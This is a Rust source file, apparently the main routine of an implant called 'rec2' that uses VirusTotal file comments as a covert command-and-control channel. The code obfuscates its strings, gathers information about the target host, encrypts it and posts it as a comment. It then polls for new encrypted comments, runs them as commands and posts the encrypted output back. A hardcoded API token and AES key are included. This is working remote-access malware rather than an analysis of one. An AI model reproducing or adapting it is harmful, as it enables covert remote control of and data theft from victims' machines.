pub mod args;
use args::extract_args;

pub mod utils;
use utils::*;

pub mod modules;
use modules::*;

use env_logger::Builder;
use log::{info,debug};

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

#[tokio::main]
async fn main() {
    // Build logger
    let common_args = extract_args();
    Builder::new()
        .filter(Some("rec2"), common_args.verbose)
        .filter_level(log::LevelFilter::Error)
        .init();

    // AES KEY its automaticaly change from Makefile
    let key = lc!("TMVB6XJWzuz4KsqUCnwxrtooQV9LmP6R4IX62HeQ7OZzhxgsahsxNzf05dJNkntl").as_bytes().to_owned();

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // TO CHANGE manually!
    // VIRUSTOTAL TOKEN
    let token = lc!("a85683b009aaaaa81049acac952516db57aaaaabefab35cc737dc219c7b87ec5").to_owned();
    // VIRUSTOTAL FULL URL
    let full_url = lc!("https://www.virustotal.com/gui/file/ef22bb40f9439587396c9dc9c2a8a938fa2485f22c533479c95264bda61704d4?nocache=1").to_owned();
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Link command:result
    let mut list_commands: Vec<String> = Vec::new();

    // Target info
    let infos = get_target_info();
    debug!("Target info: {}", infos);
    let session_hash = random_string(8);
    debug!("Session hash: {}", session_hash);

    // Parse url first
    let (_url,vtype,resource_id) = parse_virustotal_url(&full_url);
    // Post target info and session id
    // SESS:{hash}:ABCDEF\nDATAS for new session
    let encoded = hex::encode(&aes_encrypt(&infos.as_bytes(),&key)[..]);
    let datas = format!("SESS:{}:ABCDEF:\n{}",&session_hash,encoded);
    virustotal_post_comment(
        &token,
        &resource_id,
        &vtype,
        &datas,
    ).await;

    // VIRUSTOTAL IMPLANT
    loop {
        // GET resource comments on VirusTotal only for this SESSION hash
        // QUES:{hash}:{}
        let (result_spoiler,result_content,_post_id) = rec2virustotal::virustotal_get_comments(
            &token,
            &resource_id,
            &vtype,
            format!("QUES:{}",&session_hash).to_string(),
        ).await;
        // Check if new comment was posted
        for i in 0..result_content.len() {
            let (_msg_type, session_hash, job_hash) = parse_spoiler(&result_spoiler[i]);
            if !list_commands.contains(&job_hash) {
                info!("main():VirusTotal: New command to run {:?}",&result_content[i]);
                // History
                list_commands.push(job_hash.to_owned());                        // Trying to decode hexa to get command line
                let u8command = aes_decrypt(&hex::decode(&result_content[i].to_owned().to_string()).unwrap()[..], &key);
                // Trying to run command line
                let output = run_and_crypt(display_vecu8(&u8command), key.to_owned());
                info!("main():VirusTotal: Output for new command {:?}", &output);
                // POST result on VirusTotal
                let datas = format!("RESP:{}:{}:\n{}",&session_hash,&job_hash,&output);
                virustotal_post_comment(
                    &token,
                    &resource_id,
                    &vtype,
                    &datas,
                ).await;
            }
        }
        sleep(31);
    }
}